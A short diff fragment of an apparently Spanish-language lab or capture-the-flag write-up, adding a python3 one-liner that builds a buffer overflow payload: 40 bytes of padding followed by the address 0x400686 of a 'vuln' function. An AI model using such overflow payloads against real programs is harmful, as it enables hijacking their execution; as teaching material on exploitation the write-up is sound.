@@ -103,6 +103,9 @@ la dirección de entrada en la funcion vuln que es:
 
 >0x0000000000400686
 
+El payload debe ser algo como:
+> $(python3 -c 'print ("A" * 32 + "B" *  8 + "\x86\x06\x40\x00\x00\x00\x00\x00")')
+
 
 
 
